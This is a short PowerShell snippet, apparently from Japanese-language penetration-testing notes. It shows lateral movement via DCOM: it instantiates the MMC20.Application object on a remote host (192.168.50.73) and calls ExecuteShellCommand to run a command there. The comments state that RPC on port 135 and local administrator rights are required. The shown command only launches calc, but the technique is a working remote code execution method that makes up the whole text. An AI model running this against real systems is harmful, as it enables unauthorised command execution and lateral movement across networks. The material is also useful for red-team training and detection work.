```sh
# RPC（通常は135ポート）が必要
# ローカル管理者でのアクセスが必要

# MMCアプリケーションオブジェクトのリモートインスタンス化
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

# 任意のコマンドを実行
# ExecuteShellCommandの引数はCommand、 Directory、Parameters、およびWindowState の4 つ
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

```